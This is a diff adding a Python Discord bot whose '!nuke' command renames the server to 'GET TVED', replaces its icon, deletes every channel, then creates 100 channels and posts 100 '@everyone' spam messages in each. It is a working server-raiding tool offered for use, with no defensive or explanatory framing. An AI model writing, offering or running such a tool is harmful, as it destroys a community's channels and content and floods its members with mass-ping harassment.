@@ -1,0 +1,42 @@
+import discord
+from discord.ext import commands
+
+TOKEN = "YOUR_BOT_TOKEN"
+intents = discord.Intents.default()
+intents.guilds = True
+intents.guild_messages = True
+intents.message_content = True  
+
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f'Bot is online as {bot.user}')
+
+@bot.command()
+@commands.has_permissions(manage_guild=True)
+async def nuke(ctx):
+    await ctx.guild.edit(name="GET TVED")
+    print("Server name changed to: GET TVED")
+
+    await ctx.guild.edit(icon=discord.File('path/to/your/image.png'))  
+    print("Server profile picture changed.")
+
+    for channel in ctx.guild.channels:
+        await channel.delete()
+        print(f'Deleted channel: {channel.name}')
+
+    for i in range(100):
+        new_channel = await ctx.guild.create_text_channel("GET TVED")
+        print(f'Created channel: {new_channel.name}')
+        
+        for j in range(100):  
+            await new_channel.send('@everyone GET TVED!')
+            print(f'Sent message {j + 1} in {new_channel.name}')
+
+@nuke.error
+async def nuke_error(ctx, error):
+    if isinstance(error, commands.MissingPermissions):
+        await ctx.send("You do not have permission to manage the server and channels.")
+
+bot.run(TOKEN)
